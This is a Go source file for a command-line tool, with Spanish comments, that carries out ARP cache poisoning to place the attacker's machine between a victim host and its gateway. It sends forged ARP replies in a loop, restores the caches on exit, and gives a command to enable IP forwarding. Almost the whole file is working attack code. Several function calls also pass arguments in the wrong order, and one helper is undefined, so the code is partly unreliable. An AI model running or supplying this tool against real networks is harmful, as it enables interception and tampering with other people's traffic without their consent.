// FICHERO: suplantacion.go
package main

import (
	"bytes"
	//"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/spf13/cobra"
)

func NewSpoofCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "spoof",
		Short: "Realiza ataques de suplantación en la red local (Man-in-the-Middle)",
		Long:  "Contiene herramientas para envenenar cachés de protocolos como ARP para interceptar tráfico. Habilita el Reenvío de Paquetes (IP Forwarding): Set-NetIPInterface -Forwarding Enabled",
	}
	cmd.AddCommand(newArpSpoofCmd())
	return cmd
}

func newArpSpoofCmd() *cobra.Command {
	var ifaceName, victimIP, gatewayIP string

	cmd := &cobra.Command{
		Use:   "arp",
		Short: "Realiza envenenamiento de caché ARP para un ataque MitM",
		Long: `Envía paquetes ARP falsificados a una víctima y a la puerta de enlace para
redirigir su tráfico a través de tu máquina. Requiere privilegios de root/Administrador.`,
		Run: func(cmd *cobra.Command, args []string) {
			if ifaceName == "" || victimIP == "" || gatewayIP == "" {
				log.Fatal("Error: Se requiere una interfaz (-i), una IP de víctima (-t) y una IP de puerta de enlace (-g).")
			}
			runArpSpoof(ifaceName, victimIP, gatewayIP)
		},
	}
	cmd.Flags().StringVarP(&ifaceName, "interface", "i", "", "Nombre de la interfaz de red a usar")
	cmd.Flags().StringVarP(&victimIP, "target", "t", "", "Dirección IP de la máquina víctima")
	cmd.Flags().StringVarP(&gatewayIP, "gateway", "g", "", "Dirección IP de la puerta de enlace (router)")

	return cmd
}

// runArpSpoof es el motor del ataque de envenenamiento.
func runArpSpoof(ifaceName, victimIPStr, gatewayIPStr string) {
	// 1. Abrir la interfaz de red con pcap
	handle, err := pcap.OpenLive(ifaceName, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error al abrir la interfaz '%s': %v. ¿Instalaste Npcap?", ifaceName, err)
	}
	defer handle.Close()

	// 2. Obtener las direcciones MAC necesarias
	log.Println("Obteniendo direcciones MAC...")
	localHWAddr, localIP := getIfaceDetails(ifaceName)
	victimHWAddr := getMacAddr(handle, localIP, localHWAddr, net.ParseIP(victimIPStr))
	gatewayHWAddr := getMacAddr(handle, localIP, localHWAddr, net.ParseIP(gatewayIPStr))
	
	log.Printf("  - Mi MAC: %s", localHWAddr)
	log.Printf("  - MAC de la Víctima (%s): %s", victimIPStr, victimHWAddr)
	log.Printf("  - MAC del Gateway (%s): %s", gatewayIPStr, gatewayHWAddr)

	// 3. Iniciar el bucle de envenenamiento
	log.Println("\n¡Iniciando envenenamiento ARP! Presiona Ctrl+C para detener y restaurar la red.")
	
	victimIP := net.ParseIP(victimIPStr)
	gatewayIP := net.ParseIP(gatewayIPStr)
	
	stopChan := make(chan bool)
	go func() {
		for {
			select {
			case <-stopChan:
				return
			default:
				// Envenenar a la víctima (decirle que nosotros somos el gateway)
				sendArpPacket(handle, gatewayIP, localHWAddr, victimIP, victimHWAddr)
				// Envenenar al gateway (decirle que nosotros somos la víctima)
				sendArpPacket(handle, victimIP, localHWAddr, gatewayIP, gatewayHWAddr)
				time.Sleep(2 * time.Second)
			}
		}
	}()
	
	// Esperar a que el usuario presione Ctrl+C
	waitForInterrupt()

	// 4. Restaurar la red (muy importante)
	log.Println("\nSeñal de interrupción recibida. Restaurando la red...")
	close(stopChan)
	// Enviar paquetes correctos para corregir las cachés ARP
	for i := 0; i < 3; i++ {
		sendArpPacket(handle, gatewayIP, gatewayHWAddr, victimIP, victimHWAddr)
		sendArpPacket(handle, victimIP, victimHWAddr, gatewayIP, gatewayHWAddr)
		time.Sleep(1 * time.Second)
	}
	log.Println("Red restaurada. Ataque finalizado.")
}

// --- FUNCIONES AUXILIARES DE ARP ---

// getIfaceDetails obtiene la MAC y la IP de nuestra propia interfaz.
func getIfaceDetails(ifaceName string) (net.HardwareAddr, net.IP) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil { log.Fatal(err) }
	addrs, err := iface.Addrs()
	if err != nil { log.Fatal(err) }
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return iface.HardwareAddr, ipnet.IP
		}
	}
	log.Fatal("No se pudo encontrar una IP IPv4 para la interfaz.")
	return nil, nil
}

// getMacAddr envía una petición ARP para descubrir la MAC de una IP.
func getMacAddr(handle *pcap.Handle, srcIP net.IP, srcHW net.HardwareAddr, dstIP net.IP) net.HardwareAddr {
	sendArpPacket(handle, srcIP, layers.EthernetBroadcast, dstIP, srcHW) // Usamos MAC broadcast para preguntar
	for {
		packetData, _, err := handle.ReadPacketData()
		if err != nil { continue }
		packet := gopacket.NewPacket(packetData, layers.LayerTypeEthernet, gopacket.Default)
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			arp, _ := arpLayer.(*layers.ARP)
			if arp.Operation == layers.ARPReply && bytes.Equal(arp.SourceProtAddress, dstIP) {
				return arp.SourceHwAddress
			}
		}
	}
}

// sendArpPacket construye y envía un paquete ARP.
func sendArpPacket(handle *pcap.Handle, srcIP net.IP, dstHW net.HardwareAddr, dstIP net.IP, srcHW net.HardwareAddr) {
	eth := layers.Ethernet{
		SrcMAC:       srcHW,
		DstMAC:       dstHW,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply, // Mentimos diciendo que es una respuesta
		SourceHwAddress:   srcHW,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstHW,
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	handle.WritePacketData(buf.Bytes())
}